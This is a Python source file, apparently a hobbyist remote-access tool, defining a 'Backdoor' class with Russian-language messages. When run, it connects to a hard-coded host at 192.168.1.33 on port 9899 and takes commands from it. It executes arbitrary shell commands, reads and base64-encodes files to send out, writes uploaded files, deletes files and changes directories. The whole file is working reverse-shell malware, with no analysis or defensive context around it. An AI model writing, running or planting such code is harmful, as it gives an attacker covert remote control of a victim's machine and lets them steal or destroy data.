
import os

import socket
import subprocess
import json
import base64

class Backdoor:
    def __init__(self, ip, port) :
    
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True).decode('cp866')
        except subprocess.CalledProcessError:
            return 'Неверная введенная комманда'
    def reliable_send(self, data):
        json_data = json.dumps(data).encode()   
        self.connection.send(json_data)
    
    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('cp866')
                return json.loads(json_data.encode())
            except ValueError:
                pass
    def change_working_directory_to(self, path):
       
            os.chdir(path)
            return("Мы поменяли рабочую директорию на: ") + path
        
    def read_file(self, filename):
      
        with open(filename, 'rb') as file:   
            return base64.b64encode(file.read())
       
    def write_file(self, filename, content):
        
            with open(filename, 'wb') as file:
                file.write(base64.b64decode(content))
                return("Скачивание завершено")
    def delete_file(self, filename):
        os.system(f'del {filename}')
        return 'Успешно удалено'
    def run(self):
        while True:
        
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()      
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1]).decode('cp866')
                    
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == 'delete':
                    command_result = self.delete_file(command[1])
                else:
                    
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result =  'ОШИБКА'
            
            self.reliable_send(command_result)
           

my_backdoor = Backdoor('192.168.1.33', 9899)
my_backdoor.run()